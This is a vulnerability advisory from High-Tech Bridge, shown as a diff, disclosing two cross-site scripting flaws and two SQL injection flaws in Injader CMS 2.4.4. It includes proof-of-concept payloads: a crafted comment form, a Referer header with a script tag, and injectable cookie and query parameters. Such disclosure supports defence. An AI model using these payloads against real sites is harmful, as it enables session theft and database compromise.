@@ -1,0 +1,57 @@
+Vulnerability ID: HTB22745
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_injader_cms_1.html
+Product: Injader CMS
+Vendor: http://www.injader.com/ ( http://www.injader.com/ ) 
+Vulnerable Version: 2.4.4
+Vendor Notification: 07 December 2010 
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+The vulnerability exists due to failure in the "/comment.php" script to properly sanitize user-supplied input in "txtGuestURL" variable.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+<form action="http://injader/comment.php?action=create&area=1" method="post" name="main" >
+<input type="hidden" name="txtGuestName" value="test"/>
+<input type="hidden" name="txtGuestEmail" value="test@mail.com"/>
+<input type="hidden" name="chkPreview" value="on"/>
+<input type="hidden" name="txtContent" value="test"/>
+<input type="hidden" name="txtArticleID" value="1"/>
+<input type="hidden" name="txtGuestURL" value='http://123.com"><script>alert("XSS");</script>'/>
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "IJ-Login" variable from cookie.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+GET /index.php HTTP/1.1
+Cookie: IJ-Login=123'SQL_CODE_HERE
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/search.php" script to properly sanitize user-supplied input in "area1" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+http://[host]/search.php?go=yes&q=a&area1=123%27SQL_CODE
+
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+The vulnerability exists due to failure in the "/login.php" script to properly sanitize user-supplied input in "Referer" variable.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+GET /login.php HTTP/1.1
+Referer: "><script>alert('XSS');</script>
